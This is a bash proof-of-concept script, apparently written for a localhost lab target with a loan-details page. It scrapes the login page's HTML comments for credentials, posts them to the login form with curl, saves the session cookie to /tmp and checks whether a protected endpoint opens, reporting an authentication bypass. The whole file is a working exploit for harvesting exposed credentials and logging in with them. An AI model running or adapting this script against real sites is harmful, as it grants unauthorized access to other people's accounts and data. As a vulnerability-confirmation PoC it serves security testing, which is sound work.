#!/bin/bash

# POC: Information Disclosure - Credentials Exposed in HTML Comments
# Description: Extract credentials from HTML comments and verify they work

TARGET_URL="http://localhost:80"
LOGIN_PAGE="${TARGET_URL}/login"
LOAN_DETAILS="${TARGET_URL}/loan_details"

echo "[*] POC: Credentials Exposed in HTML Comments"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Step 1: Fetch the login page and check for exposed credentials in comments
echo "[+] Step 1: Fetching login page and searching for credentials in HTML comments..."
RESPONSE=$(curl -s "${LOGIN_PAGE}")

# Extract credentials from HTML comments
CREDENTIALS=$(echo "${RESPONSE}" | grep -oP '<!--.*?-->' | grep -i 'test\|password\|credential')

if [ -n "${CREDENTIALS}" ]; then
    echo "[✓] Found credentials in HTML comments:"
    echo "${CREDENTIALS}"
    echo ""
    
    # Extract username and password
    USERNAME=$(echo "${CREDENTIALS}" | grep -oP 'test' | head -1)
    PASSWORD=$(echo "${CREDENTIALS}" | grep -oP 'test' | tail -1)
    
    echo "[+] Step 2: Attempting to authenticate with discovered credentials..."
    echo "    Username: ${USERNAME}"
    echo "    Password: ${PASSWORD}"
    echo ""
else
    echo "[-] No credentials found in HTML comments on login page"
    exit 1
fi

# Step 2: Attempt authentication with the discovered credentials
echo "[+] Step 3: Testing authentication..."
AUTH_RESPONSE=$(curl -s -X POST "${LOGIN_PAGE}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=${USERNAME}&password=${PASSWORD}" \
    -c /tmp/cookies.txt)

# Check if authentication was successful by accessing protected endpoint
PROTECTED=$(curl -s -b /tmp/cookies.txt "${LOAN_DETAILS}")

if echo "${PROTECTED}" | grep -q "user_id\|loan\|details" && ! echo "${PROTECTED}" | grep -q "login\|unauthorized\|forbidden"; then
    echo "[✓] Authentication SUCCESSFUL with exposed credentials!"
    echo "[✓] Successfully accessed protected endpoint: ${LOAN_DETAILS}"
    echo ""
    echo "[!] VULNERABILITY CONFIRMED:"
    echo "    - Credentials found in HTML source code comments"
    echo "    - Credentials are valid and grant access to protected resources"
    echo "    - Severity: HIGH - Complete authentication bypass possible"
    exit 0
else
    echo "[-] Authentication or access verification failed"
    echo "[-] Response from protected endpoint:"
    echo "${PROTECTED}"
    exit 1
fi